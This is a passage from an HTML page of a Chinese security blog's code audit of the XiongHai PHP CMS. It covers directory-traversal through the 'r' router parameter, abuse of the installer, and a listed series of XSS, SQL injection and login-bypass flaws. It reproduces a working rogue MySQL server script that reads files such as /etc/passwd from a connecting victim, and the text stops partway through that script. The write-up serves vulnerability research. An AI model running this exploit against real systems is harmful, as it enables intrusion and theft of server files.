<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="HandheldFriendly" content="True"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5"><meta name="description" content="熊海CMS代码审计架构审计代码从架构开始，这个CMS架构比较简单，简单的MVC设计模式，根据参数r决定路由的分发，这个路由分发可能导致一个致命的缺陷导致最终实现RCE 123456&lt;?phperror_reporting(0); $file&#x3D;addslashes($_GET[&amp;#x27;r&amp;#x27;]); $action&#x3D;$file&#x3D;&#x3D;&amp;#x27;&amp;#x27;?&amp;#x27;index&amp;#x"><meta property="og:type" content="article"><meta property="og:title" content="Y4教你审计系列之熊海CMS代码审计"><meta property="og:url" content="https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html"><meta property="og:site_name" content="Y4tacker:Hacking The World!"><meta property="og:description" content="熊海CMS代码审计架构审计代码从架构开始，这个CMS架构比较简单，简单的MVC设计模式，根据参数r决定路由的分发，这个路由分发可能导致一个致命的缺陷导致最终实现RCE 123456&lt;?phperror_reporting(0); $file&#x3D;addslashes($_GET[&amp;#x27;r&amp;#x27;]); $action&#x3D;$file&#x3D;&#x3D;&amp;#x27;&amp;#x27;?&amp;#x27;index&amp;#x"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/2.png"><meta property="og:image" content="https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/3.png"><meta property="og:image" content="https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/14.png"><meta property="og:image" content="https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/15.png"><meta property="og:image" content="https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/18.png"><meta property="og:image" content="https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/20.png"><meta property="og:image" content="https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/21.png"><meta property="og:image" content="https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/19.png"><meta property="og:image" content="https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/4.png"><meta property="og:image" content="https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/5.png"><meta property="og:image" content="https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/7.png"><meta property="og:image" content="https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/8.png"><meta property="og:image" content="https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/6.png"><meta property="og:image" content="https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/11.png"><meta property="og:image" content="https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/12.png"><meta property="og:image" content="https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/13.png"><meta property="og:image" content="https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/9.png"><meta property="og:image" content="https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/10.png"><meta property="og:image" content="https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/17.png"><meta property="article:published_time" content="2022-06-16T01:16:08.000Z"><meta property="article:modified_time" content="2024-08-04T09:01:49.463Z"><meta property="article:author" content="Y4tacker"><meta property="article:tag" content="代码审计"><meta property="article:tag" content="PHP"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/2.png"><link rel="shortcut icon" href="/images/favicon.ico"><link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><title>Y4教你审计系列之熊海CMS代码审计</title><link rel="stylesheet" href="/css/style.css"><meta name="generator" content="Hexo 5.4.1"><link rel="alternate" href="/atom.xml" title="Y4tacker:Hacking The World!" type="application/atom+xml"></head><body class="max-width mx-auto px3 ltr"><div id="header-post"><a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a> <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a> <a id="top-icon-tablet" href="#" aria-label="Top" onclick='$("html, body").animate({scrollTop:0},"fast")' style="display:none"><i class="fa-solid fa-chevron-up fa-lg"></i></a> <span id="menu"><span id="nav"><ul><li><a href="/">Home</a></li><li><a href="/archives/">Writing</a></li><li><a href="/tags/">Topics</a></li><li><a href="/search/">Search</a></li><li><a href="/about/">About</a></li><li><a href="/link/">Friends</a></li></ul></span><br><span id="actions"><ul><li><a class="icon" aria-label="Previous post" href="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8BRockOA/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle()' onmouseout='$("#i-prev").toggle()'></i></a></li><li><a class="icon" aria-label="Next post" href="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%BA%8C/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle()' onmouseout='$("#i-next").toggle()'></i></a></li><li><a class="icon" aria-label="Back to top" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle()' onmouseout='$("#i-top").toggle()'></i></a></li><li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle()' onmouseout='$("#i-share").toggle()' onclick='return $("#share").toggle(),!1'></i></a></li></ul><span id="i-prev" class="info" style="display:none">Previous post</span> <span id="i-next" class="info" style="display:none">Next post</span> <span id="i-top" class="info" style="display:none">Back to top</span> <span id="i-share" class="info" style="display:none">Share post</span></span><br><div id="share" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="fab fa-facebook" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&text=Y4教你审计系列之熊海CMS代码审计"><i class="fab fa-twitter" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=Y4教你审计系列之熊海CMS代码审计"><i class="fab fa-linkedin" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&is_video=false&description=Y4教你审计系列之熊海CMS代码审计"><i class="fab fa-pinterest" aria-hidden="true"></i></a></li><li><a class="icon" href="mailto:?subject=Y4教你审计系列之熊海CMS代码审计&body=Check out this article: https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="fa-solid fa-envelope" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=Y4教你审计系列之熊海CMS代码审计"><i class="fab fa-get-pocket" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=Y4教你审计系列之熊海CMS代码审计"><i class="fab fa-reddit" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=Y4教你审计系列之熊海CMS代码审计"><i class="fab fa-stumbleupon" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=Y4教你审计系列之熊海CMS代码审计"><i class="fab fa-digg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&name=Y4教你审计系列之熊海CMS代码审计&description="><i class="fab fa-tumblr" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&t=Y4教你审计系列之熊海CMS代码审计"><i class="fab fa-hacker-news" aria-hidden="true"></i></a></li></ul></div><div id="toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.</span> <span class="toc-text">熊海CMS代码审计</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%B6%E6%9E%84"><span class="toc-number">1.1.</span> <span class="toc-text">架构</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%B1%E6%AD%A4%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E7%9A%84%E5%89%8D%E5%8F%B0RCE"><span class="toc-number">1.1.1.</span> <span class="toc-text">由此可能存在的前台RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0%E9%85%8D%E5%90%88%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.2.</span> <span class="toc-text">前台配合目录穿越读文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9C%9F%E6%AD%A3%E7%9A%84%E5%89%8D%E5%8F%B0RCE"><span class="toc-number">1.1.3.</span> <span class="toc-text">真正的前台RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E7%BB%95%E8%BF%87%E5%85%8D%E5%AF%86%E7%A0%81%E7%99%BB%E5%85%A5%E5%90%8E%E5%8F%B0-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83"><span class="toc-number">1.2.</span> <span class="toc-text">逻辑绕过免密码登入后台-垂直越权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0"><span class="toc-number">1.3.</span> <span class="toc-text">前台</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0XSS1-%E7%AA%81%E7%A0%B4addslashes%E5%AD%97%E7%AC%A6%E9%99%90%E5%88%B6"><span class="toc-number">1.3.1.</span> <span class="toc-text">前台XSS1+突破addslashes字符限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0XSS2"><span class="toc-number">1.3.2.</span> <span class="toc-text">前台XSS2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0XSS3-%E5%90%8C%E6%A0%B7%E4%BE%8B%E5%AD%90%E5%A4%AA%E5%A4%9A%E5%B0%B1%E4%B8%8D%E5%88%97%E4%B8%BE%E4%BA%86"><span class="toc-number">1.3.3.</span> <span class="toc-text">前台XSS3-同样例子太多就不列举了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-content-software%E4%B8%A4%E4%B8%AA%E9%A1%B5%E9%9D%A2%E5%90%8C%E7%90%86"><span class="toc-number">1.3.4.</span> <span class="toc-text">前台SQL注入 content&#x2F;software两个页面同理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E9%80%BB%E8%BE%91%E9%97%AE%E9%A2%98"><span class="toc-number">1.3.5.</span> <span class="toc-text">验证码逻辑问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.6.</span> <span class="toc-text">前台SQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E8%BF%9B%E5%85%A5%E5%90%8E%E5%8F%B0"><span class="toc-number">1.3.7.</span> <span class="toc-text">万能密码进入后台</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0"><span class="toc-number">1.4.</span> <span class="toc-text">后台</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%B8%AA%E5%8F%AF%E8%A1%8C%E7%9A%84RCE%E6%96%B9%E6%A1%88"><span class="toc-number">1.5.</span> <span class="toc-text">一个可行的RCE方案</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">1.6.</span> <span class="toc-text">参考文章</span></a></li></ol></li></ol></div></span></div><div class="content index py4"><article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting"><header><h1 class="posttitle p-name" itemprop="name headline">Y4教你审计系列之熊海CMS代码审计</h1><div class="meta"><span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person"><span class="p-name" itemprop="name">Y4tacker</span></span><div class="postdate"><time datetime="2022-06-16T01:16:08.000Z" class="dt-published" itemprop="datePublished">2022-06-16</time> (Updated: <time datetime="2024-08-04T09:01:49.463Z" class="dt-updated" itemprop="dateModified">2024-08-04</time>)</div><div class="article-category"><i class="fa-solid fa-archive"></i> <a class="category-link" href="/categories/PHP/">PHP</a></div><div class="article-tag"><i class="fa-solid fa-tag"></i> <a class="p-category" href="/tags/PHP/" rel="tag">PHP</a>, <a class="p-category" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></div></div></header><div class="content e-content" itemprop="articleBody"><h1 id="熊海CMS代码审计"><a href="#熊海CMS代码审计" class="headerlink" title="熊海CMS代码审计"></a>熊海CMS代码审计</h1><h2 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h2><p>审计代码从架构开始，这个CMS架构比较简单，简单的MVC设计模式，根据参数r决定路由的分发，这个路由分发可能导致一个致命的缺陷导致最终实现RCE</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="variable">$file</span>=addslashes(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]); </span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$file</span>==<span class="string">&#x27;&#x27;</span>?<span class="string">&#x27;index&#x27;</span>:<span class="variable">$file</span>; </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;files/&#x27;</span>.<span class="variable">$action</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="由此可能存在的前台RCE"><a href="#由此可能存在的前台RCE" class="headerlink" title="由此可能存在的前台RCE"></a>由此可能存在的前台RCE</h3><p>我们知道熊海安装会先判断同文件夹下有无InstallLock.txt作为是否安装的判断标准</p><p>那如果我们通过上面这个路由分发实现目录穿越，那当前目录也就是web目录下的index.php是没有这个文件的</p><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/2.png"></p><p>没有对参数做处理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$save=$_POST[&#x27;save&#x27;];</span><br><span class="line">$user=$_POST[&#x27;user&#x27;];</span><br><span class="line">$password=md5($_POST[&#x27;password&#x27;]);</span><br><span class="line">$dbhost=$_POST[&#x27;dbhost&#x27;];</span><br><span class="line">$dbuser=$_POST[&#x27;dbuser&#x27;];</span><br><span class="line">$dbpwd=$_POST[&#x27;dbpwd&#x27;];</span><br><span class="line">$dbname=$_POST[&#x27;dbname&#x27;];</span><br></pre></td></tr></table></figure><p>可惜由于有第一行include失败导致代码终止，不然通过这个我们一方面可以尝试fakemysql读取任意文件，另一方面可以实现往web目录上一层写文件之后再包含实现RCE，有点可惜</p><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/3.png"></p><p>有没有解决的办法呢？有那就是找一个和install/index.php相对路径相同的并且存在如上代码的地方，有么</p><p>答案是有，我们可以通过此路由成功保留install的所有功能</p><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/14.png"></p><h3 id="前台配合目录穿越读文件"><a href="#前台配合目录穿越读文件" class="headerlink" title="前台配合目录穿越读文件"></a>前台配合目录穿越读文件</h3><p>可以看见mysql成功建立连接</p><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/15.png"></p><p>但是毕竟admin目录下没有sql文件，如果能配合文件上传也能搞事情待会儿研究下</p><p>不过这时候可以做一件事情，通过fakemysql去读任意文件了，也是存在的点，这里由于php版本不一致需要构造不同的tcp数据包，这里我用了github上找到的一个和我php5.2版本能用的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unhex</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123; <span class="keyword">return</span> pack(<span class="string">&quot;H*&quot;</span>, preg_replace(<span class="string">&#x27;#[^a-f0-9]+#si&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$str</span>)); &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$srv</span> = stream_socket_server(<span class="string">&quot;tcp://0.0.0.0:1237&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Enter filename to get [<span class="subst">$filename</span>] &gt; &quot;</span>;</span><br><span class="line">  <span class="variable">$newFilename</span> = rtrim(fgets(STDIN), <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$newFilename</span>)) &#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$newFilename</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;[.] Waiting for connection on 0.0.0.0:1237\n&quot;</span>;</span><br><span class="line">  <span class="variable">$s</span> = stream_socket_accept(<span class="variable">$srv</span>, -<span class="number">1</span>, <span class="variable">$peer</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;[+] Connection from <span class="subst">$peer</span> - greet... &quot;</span>;</span><br><span class="line">  fwrite(<span class="variable">$s</span>, unhex(<span class="string">&#x27;45 00 00 00 0a 35 2e 31  2e 36 33 2d 30 75 62 75</span></span><br><span class="line"><span class="string">                    6e 74 75 30 2e 31 30 2e  30 34 2e 31 00 26 00 00</span></span><br><span class="line"><span class="string">                    00 7a 42 7a 60 51 56 3b  64 00 ff f7 08 02 00 00</span></span><br><span class="line"><span class="string">                    00 00 00 00 00 00 00 00  00 00 00 00 64 4c 2f 44</span></span><br><span class="line"><span class="string">                    47 77 43 2a 43 56 63 72  00                     &#x27;</span>));</span><br><span class="line">  fread(<span class="variable">$s</span>, <span class="number">8192</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;auth ok... &quot;</span>;</span><br><span class="line">  fwrite(<span class="variable">$s</span>, unhex(<span class="string">&#x27;07 00 00 02 00 00 00 02  00 00 00&#x27;</span>));</span><br><span class="line">  fread(<span class="variable">$s</span>, <span class="number">8192</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;some shit ok... &quot;</span>;</span><br><span class="line">  fwrite(<span class="variable">$s</span>, unhex(<span class="string">&#x27;07 00 00 01 00 00 00 00  00 00 00&#x27;</span>));</span><br><span class="line">  fread(<span class="variable">$s</span>, <span class="number">8192</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;want file... &quot;</span>;</span><br><span class="line">  fwrite(<span class="variable">$s</span>, chr(strlen(<span class="variable">$filename</span>) + <span class="number">1</span>) . <span 